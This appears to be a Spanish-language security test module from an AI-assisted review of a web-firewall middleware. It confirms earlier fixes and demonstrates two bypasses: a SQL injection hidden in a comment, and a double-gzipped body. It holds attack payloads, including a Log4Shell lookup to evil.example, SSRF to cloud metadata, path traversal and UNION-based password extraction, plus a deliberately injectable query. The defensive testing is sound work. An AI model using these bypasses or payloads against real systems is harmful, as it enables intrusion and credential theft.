"""PoC de la revisión final independiente (IA, Claude) contra 0.9.1.

Confirma el cierre de IA-1/2/3/5 (de la revisión anterior) y añade dos
hallazgos nuevos, más estrechos, encontrados al someter el fix de IA-1 a
combinaciones adicionales. Convención: PASA = la propiedad se cumple.
"""
from __future__ import annotations

import gzip
import json
import sqlite3

from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import JSONResponse, PlainTextResponse
from starlette.routing import Route
from starlette.testclient import TestClient

from gatekeeper import Config, GatekeeperMiddleware

PASA, FALLA, INFO = "PASA", "FALLA", "INFO"


def _cliente(**cfg: object) -> TestClient:
    async def echo(request: Request) -> JSONResponse:
        return JSONResponse({"len": len(await request.body())})

    app = Starlette(routes=[Route("/{p:path}", echo, methods=["GET", "POST"])])
    cfg.setdefault("rate_limit", 0)
    app.add_middleware(GatekeeperMiddleware, config=Config(**cfg))  # type: ignore[arg-type]
    return TestClient(app, raise_server_exceptions=False)


def poc_final_ia1_cerrado_en_7_familias(resultados: list[tuple[str, str, str]]) -> None:
    """Confirma que IA-1 sigue cerrado en las 7 familias no-sqli."""
    c = _cliente()
    casos = {
        "xss": "<script>alert(1)</script>", "ssti": "{{7*7}}",
        "log4shell": "${jndi:ldap://evil.example/a}", "cmdi": "$(id)",
        "crlf": "x%0d%0aSet-Cookie:a=b", "path_traversal": "../../etc/passwd",
        "ssrf": "http://169.254.169.254/latest/meta-data/",  # NOSONAR
    }
    rotos = [f for f, p in casos.items() if c.get("/", params={"q": f"/*{p}*/"}).status_code == 200]
    if rotos:
        resultados.append((FALLA, "IA-1 ha REGRESADO en alguna familia", f"familias rotas: {rotos}"))
    else:
        resultados.append((PASA, "IA-1 sigue cerrado en las 7 familias no-sqli", ""))


def poc_final_sqli_envuelto_entero(resultados: list[tuple[str, str, str]]) -> None:
    """NUEVO-1: un payload SQLi que cabe ENTERO en un comentario no versionado se blanquea."""
    con = sqlite3.connect(":memory:", check_same_thread=False)
    con.execute("CREATE TABLE users(name TEXT, password TEXT)")
    con.execute("INSERT INTO users VALUES ('admin','s3cr3t')")  # NOSONAR

    async def buscar(request: Request) -> PlainTextResponse:
        q = request.query_params.get("name", "")
        try:
            filas = con.execute(f"SELECT name FROM users WHERE name = '{q}'").fetchall()  # NOSONAR
        except Exception as exc:  # noqa: BLE001 - PoC, no es código de producción
            return PlainTextResponse(f"error: {exc}")
        return PlainTextResponse(json.dumps(filas))

    app = Starlette(routes=[Route("/buscar", buscar)])
    app.add_middleware(GatekeeperMiddleware, config=Config(rate_limit=0))
    c = TestClient(app, raise_server_exceptions=False)

    directo = c.get("/buscar", params={"name": "' OR '1'='1"}).status_code
    atk = "x' UNION SELECT password FROM users -- "
    envuelto = c.get("/buscar", params={"name": f"/*{atk}*/"})
    if directo == 403 and envuelto.status_code == 200:
        resultados.append((
            FALLA,
            "NUEVO-1: un SQLi que cabe entero en /*...*/ (sin versionar) se blanquea",
            (f"directo -> 403 (control); envuelto entero -> {envuelto.status_code}, "
            f"respuesta: {envuelto.text[:120]!r}. normalize() convierte "
            "'/*payload*/' completo en un solo espacio cuando el comentario no "
            "es versionado (no empieza por '!'), y la familia sqli -a "
            "diferencia de las otras diez tras el fix de IA-1- NO tiene una "
            "segunda lectura sobre el texto sin recortar: solo ve la vista "
            "'stripped', que aquí queda vacía"),
        ))
    else:
        resultados.append((PASA, "NUEVO-1: el sqli envuelto entero se sigue bloqueando", ""))


def poc_final_gzip_doble(resultados: list[tuple[str, str, str]]) -> None:
    """NUEVO-2: Content-Encoding: gzip solo deshace UN nivel; un gzip-de-gzip no se inspecciona."""
    atk = json.dumps({"q": "1 union select password from users"}).encode()
    doble = gzip.compress(gzip.compress(atk))

    async def echo_doble(request: Request) -> JSONResponse | PlainTextResponse:
        raw = await request.body()
        try:
            return JSONResponse({"decoded": gzip.decompress(gzip.decompress(raw)).decode()})  # NOSONAR
        except Exception as exc:  # noqa: BLE001 - PoC
            return PlainTextResponse(f"err {exc}")

    app = Starlette(routes=[Route("/", echo_doble, methods=["POST"])])
    app.add_middleware(GatekeeperMiddleware, config=Config(rate_limit=0))
    c = TestClient(app, raise_server_exceptions=False)

    simple = c.post(
        "/", content=gzip.compress(atk),
        headers={"content-type": "application/json", "content-encoding": "gzip"},
    )
    r = c.post(
        "/", content=doble,
        headers={"content-type": "application/json", "content-encoding": "gzip"},
    )
    if simple.status_code == 403 and r.status_code == 200:
        resultados.append((
            FALLA,
            "NUEVO-2: un body con doble gzip no se inspecciona (solo se deshace 1 nivel)",
            (f"gzip simple -> 403 (control, confirma que la descompresión de 1 "
            f"nivel SÍ funciona); gzip(gzip(ataque)) -> {r.status_code}, cuerpo "
            f"que recibiría una app que también descomprime dos veces: "
            f"{r.json() if r.status_code == 200 else '-'}. Caso de borde: "
            "requiere que algo entre el cliente y la app comprima dos veces "
            "(infraestructura inusual), no que Starlette/FastAPI lo hagan "
            "solos"),
        ))
    else:
        resultados.append((PASA, "NUEVO-2: el gzip anidado no cambia el veredicto", ""))


def poc_final_zip_bomb_acotada(resultados: list[tuple[str, str, str]]) -> None:
    """Confirma (positivo) que una bomba de descompresión de 1 nivel SÍ está acotada."""
    import time
    import tracemalloc

    c = _cliente(max_body_size=65536)
    bomba = gzip.compress(b"0" * (50 * 1024 * 1024), compresslevel=9)
    tracemalloc.start()
    t0 = time.perf_counter()
    r = c.post(
        "/",
        content=bomba,
        headers={"content-type": "application/json", "content-encoding": "gzip"},
    )
    dt = time.perf_counter() - t0
    _cur, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    if r.status_code == 413 and dt < 1.0 and peak < 5_000_000:
        resultados.append((
            PASA,
            "la bomba de descompresión (1 nivel) está acotada en tiempo y memoria",
            (f"50 MB descomprimidos de 51 KB comprimidos -> HTTP {r.status_code} "
            f"en {dt * 1000:.0f} ms, pico {peak / 1e6:.1f} MB"),
        ))
    else:
        resultados.append((
            FALLA, "la bomba de descompresión NO está acotada",
            f"HTTP {r.status_code} en {dt * 1000:.0f} ms, pico {peak / 1e6:.1f} MB",
        ))


COMPROBACIONES = [
    ("final_ia1", poc_final_ia1_cerrado_en_7_familias, "IA-1 sigue cerrado (regresión)"),
    ("final_sqli_envuelto", poc_final_sqli_envuelto_entero, "sqli envuelto entero en /*...*/"),
    ("final_gzip_doble", poc_final_gzip_doble, "gzip anidado (doble compresión)"),
    ("final_zipbomb", poc_final_zip_bomb_acotada, "bomba de descompresión de 1 nivel, acotada"),
]
